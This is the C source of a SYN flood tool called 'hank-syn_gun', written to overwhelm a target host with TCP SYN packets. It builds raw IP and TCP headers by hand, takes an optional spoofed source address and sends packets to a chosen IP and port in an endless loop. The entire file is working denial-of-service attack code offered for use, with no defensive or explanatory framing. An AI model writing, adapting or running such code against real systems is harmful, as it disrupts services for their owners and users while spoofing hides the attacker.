/*

	title		-> hank-syn_gun
	description	-> used to flood the target with tcp syn requests
	author		-> hank

*/

#include<stdio.h>
#include<stdlib.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include<string.h>

#include "ip_hdr.h"
#include "tcp_hdr.h"

#define		IP_DONT_FRAG	0x4000
#define		IP_MORE_FRAG	0x2000
#define		TCP_SYN		0x02

void main(int argc,char *argv[])
{
 char hdr[60];
 struct ip_hdr *ip_hdr=(struct ip_hdr *)hdr;
 struct tcp_hdr *tcp_hdr/*=(struct tcp_hdr *)(sizeof(struct ip_hdr)+hdr)*/;
 struct sockaddr_in src,dst;
 int sock_fd,on,loop;
 unsigned short int ip_flags,ip_offset,src_set=0,dst_set=0,tcp_data_hdr,tcp_offset=0,tcp_flags;
 long long int flood_count;

 if(argc < 2)
 {
	printf("usage: hank-syn_flood [options]\n");
	printf("-h or --help for more help\n");
	exit(0);
 }

 dst.sin_family=AF_INET;
 src.sin_family=AF_INET;

 for(loop=1;loop < argc;loop++)
 {
	if(argv[loop][0]=='-')
	{
		if(argv[loop][1]=='d' && strlen(argv[loop])==2 && dst_set==0 && (argc-(loop+1))>=2)
		{
			dst_set=1;
			loop++;
			if((dst.sin_addr.s_addr=inet_addr(argv[loop]))==INADDR_NONE)
			{
				printf("dst_addr: invalid destination address\n");;
				exit(0);
			}
			loop++;
			dst.sin_port=htons(atoi(argv[loop]));
			if(dst.sin_port==0)
			{
				printf("port: invalid port\n");
				exit(0);
			}
		}

		else if(argv[loop][1]=='s' && strlen(argv[loop])==2 && src_set==0 && (argc-(loop+1))>=1)
		{
			src_set=1;
			loop++;
			if((src.sin_addr.s_addr=inet_addr(argv[loop]))==INADDR_NONE)
			{
				perror("src_addr: invalid source address\n");
				exit(0);
			}
		}

		else if((argv[loop][1]=='h' && strlen(argv[loop])==2) || !strcmp(argv[loop],"--help"))
		{
			printf("usage: hank-syn_flood [options]\n");
			printf("\noptions :\n\n-d [ip_addr] [port]\t- destinations ip address and port\n");
			printf("-s [ip_addr]\t\t- spoof source ip address.port will be chosen randomly (optional)\n-h or --help\t\t- this help menu\n");
			exit(0);
		}
		else
		{
			printf("invalid usage\n");
			exit(0);
		}
	}
	else
	{
		printf("usage: hank-syn_flood [options]\n");
		printf("-h or --help for more help\n");
		exit(0);
	}
 }

 if(src_set == 0)
	src.sin_addr.s_addr=INADDR_ANY;

 bzero(hdr,sizeof(hdr));
 if((sock_fd=socket(AF_INET,SOCK_RAW,IPPROTO_RAW))==-1)
 {
	perror("socket");
	exit(0);
 }

 on=1;
 if(setsockopt(sock_fd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on))==-1)
 {
	perror("setsckopt");
	exit(0);
 }

 printf("dst_ip : %s:%d\nsrc_ip : %s\n",inet_ntoa(dst.sin_addr),ntohs(dst.sin_port),inet_ntoa(src.sin_addr));

 ip_hdr->ip_hl=5;
 ip_hdr->ip_ver=4;
 ip_hdr->tos=0;
 ip_hdr->length=sizeof(hdr);
 ip_hdr->id=htons(rand()%65535);

 ip_flags=IP_DONT_FRAG;
 ip_offset=0;
 ip_offset+=ip_flags;

 ip_hdr->offset=htons(ip_offset);
 ip_hdr->ttl=64;
 ip_hdr->protocol=6;
 ip_hdr->chksm=0;
 ip_hdr->ip_src=src.sin_addr.s_addr;
 ip_hdr->ip_dst=dst.sin_addr.s_addr;

 tcp_flags=TCP_SYN;
 flood_count=1;

 while(1)
 {
	tcp_hdr=(struct tcp_hdr *)(sizeof(struct ip_hdr)+hdr);
	tcp_hdr->src_port=htons(/*(rand()%65535)+1*/135);
	tcp_hdr->dst_port=dst.sin_port;
	tcp_hdr->seq_no=htonl(/*rand()%4294967295*/80);
	tcp_hdr->ack_no=0;
	tcp_data_hdr=20480*2;
	tcp_offset=tcp_data_hdr+tcp_flags;
	tcp_hdr->offset=htons(tcp_offset);

	tcp_hdr->window=htons(43690);
	tcp_hdr->chksm=0x5431;
	tcp_hdr->u_ptr=0;

	if(sendto(sock_fd,hdr,sizeof(hdr),0,(struct sockaddr *)&dst,sizeof(dst))==-1)
	{
		perror("send");
		exit(0);
	}
	printf("\rsyn packet sent: %lld",flood_count++);
fflush(stdout);
}
}
